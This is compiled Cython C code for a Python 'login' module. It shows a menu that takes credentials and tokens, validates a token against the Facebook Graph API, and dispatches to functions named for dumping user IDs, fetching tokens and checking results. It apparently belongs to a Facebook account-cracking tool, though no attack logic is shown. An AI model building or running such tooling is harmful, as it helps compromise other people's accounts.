    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 115, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 116, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_v_user = __pyx_t_1;
    __pyx_t_1 = 0;

    
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__12, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 117, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_v_pw = __pyx_t_1;
    __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_kredensial); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 118, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_3 = NULL;
    __pyx_t_10 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
        __pyx_t_10 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_5)) {
      PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_v_user, __pyx_v_pw};
      __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 118, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_GOTREF(__pyx_t_1);
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_5)) {
      PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_v_user, __pyx_v_pw};
      __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 118, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_GOTREF(__pyx_t_1);
    } else
    #endif
    {
      __pyx_t_4 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 118, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (__pyx_t_3) {
        __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_3); __pyx_t_3 = NULL;
      }
      __Pyx_INCREF(__pyx_v_user);
      __Pyx_GIVEREF(__pyx_v_user);
      PyTuple_SET_ITEM(__pyx_t_4, 0+__pyx_t_10, __pyx_v_user);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_4, 1+__pyx_t_10, __pyx_v_pw);
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_4, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 118, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_menu);
  __pyx_t_1 = __pyx_v_menu;
  __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_4, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 119, __pyx_L1_error)
  if (!__pyx_t_8) {
  } else {
    __pyx_t_9 = __pyx_t_8;
    goto __pyx_L10_bool_binop_done;
  }
  __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_04, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 119, __pyx_L1_error)
  __pyx_t_9 = __pyx_t_8;
  __pyx_L10_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_8 = (__pyx_t_9 != 0);
  if (__pyx_t_8) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Dump); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 120, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_pencarian_nologin); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 120, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 120, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 120, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_menu);
  __pyx_t_4 = __pyx_v_menu;
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_4, __pyx_kp_u_5, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 121, __pyx_L1_error)
  if (!__pyx_t_9) {
  } else {
    __pyx_t_8 = __pyx_t_9;
    goto __pyx_L12_bool_binop_done;
  }
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_4, __pyx_kp_u_05, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 121, __pyx_L1_error)
  __pyx_t_8 = __pyx_t_9;
  __pyx_L12_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_9 = (__pyx_t_8 != 0);
  if (__pyx_t_9) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Dump); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 122, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_grup_tanpalogin); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 122, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_1)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_1);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 122, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 122, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_menu);
  __pyx_t_5 = __pyx_v_menu;
  __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_5, __pyx_kp_u_6, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 123, __pyx_L1_error)
  if (!__pyx_t_8) {
  } else {
    __pyx_t_9 = __pyx_t_8;
    goto __pyx_L14_bool_binop_done;
  }
  __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_5, __pyx_kp_u_06, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 123, __pyx_L1_error)
  __pyx_t_9 = __pyx_t_8;
  __pyx_L14_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_8 = (__pyx_t_9 != 0);
  if (__pyx_t_8) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_freetokenv1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 124, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_1)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_1);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_5 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 124, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_menu);
  __pyx_t_5 = __pyx_v_menu;
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_5, __pyx_kp_u_7, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 125, __pyx_L1_error)
  if (!__pyx_t_9) {
  } else {
    __pyx_t_8 = __pyx_t_9;
    goto __pyx_L16_bool_binop_done;
  }
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_5, __pyx_kp_u_07, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 125, __pyx_L1_error)
  __pyx_t_8 = __pyx_t_9;
  __pyx_L16_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_9 = (__pyx_t_8 != 0);
  if (__pyx_t_9) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_freetokenv2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 126, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_1)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_1);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_5 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 126, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_menu);
  __pyx_t_5 = __pyx_v_menu;
  __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_5, __pyx_kp_u_8, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 127, __pyx_L1_error)
  if (!__pyx_t_8) {
  } else {
    __pyx_t_9 = __pyx_t_8;
    goto __pyx_L18_bool_binop_done;
  }
  __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_5, __pyx_kp_u_08, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 127, __pyx_L1_error)
  __pyx_t_9 = __pyx_t_8;
  __pyx_L18_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_8 = (__pyx_t_9 != 0);
  if (__pyx_t_8) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_MenuLain); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 128, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_cek_hasil); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 128, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_5 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 128, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 128, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_menu);
  __pyx_t_1 = __pyx_v_menu;
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_9, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 129, __pyx_L1_error)
  if (!__pyx_t_9) {
  } else {
    __pyx_t_8 = __pyx_t_9;
    goto __pyx_L20_bool_binop_done;
  }
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_09, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 129, __pyx_L1_error)
  __pyx_t_8 = __pyx_t_9;
  __pyx_L20_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_9 = (__pyx_t_8 != 0);
  if (__pyx_t_9) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_MenuLain); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_cek_opsi); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_menu);
  __pyx_t_4 = __pyx_v_menu;
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_4, __pyx_kp_u_10, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 131, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_8 = (__pyx_t_9 != 0);
  if (__pyx_t_8) {

    
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__13, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 132, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_v_zz = __pyx_t_4;
    __pyx_t_4 = 0;

    
    __Pyx_INCREF(__pyx_v_zz);
    __pyx_t_4 = __pyx_v_zz;
    __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_4, __pyx_n_u_Y, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 133, __pyx_L1_error)
    if (!__pyx_t_9) {
    } else {
      __pyx_t_8 = __pyx_t_9;
      goto __pyx_L23_bool_binop_done;
    }
    __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_4, __pyx_n_u_y, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 133, __pyx_L1_error)
    __pyx_t_8 = __pyx_t_9;
    __pyx_L23_bool_binop_done:;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_9 = (__pyx_t_8 != 0);
    if (__pyx_t_9) {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 134, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_remove); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 134, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_1, __pyx_kp_u_data_apikey_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u_data_apikey_txt);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 134, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 135, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      goto __pyx_L22;
    }

    
     {
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_login); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 136, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 136, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_L22:;

    
    goto __pyx_L3;
  }

  
   {
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_login); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 137, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_1 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_1)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_1);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 137, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  }
  __pyx_L3:;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("login.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_menu);
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v_cookie);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_zz);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_5login_9get_token(PyObject *__pyx_self, PyObject *__pyx_v_token); 
static PyMethodDef __pyx_mdef_5login_9get_token = {"get_token", (PyCFunction)__pyx_pw_5login_9get_token, METH_O, 0};
static PyObject *__pyx_pw_5login_9get_token(PyObject *__pyx_self, PyObject *__pyx_v_token) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("get_token (wrapper)", 0);
  __pyx_r = __pyx_pf_5login_8get_token(__pyx_self, ((PyObject *)__pyx_v_token));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_8get_token(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_token) {
  PyObject *__pyx_v_nama = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  Py_UCS4 __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  int __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("get_token", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
     {

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ses); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 141, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 141, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_token, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 141, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_8 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https_graph_facebook_com_me_acce, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 141, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_5 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_6, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 141, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
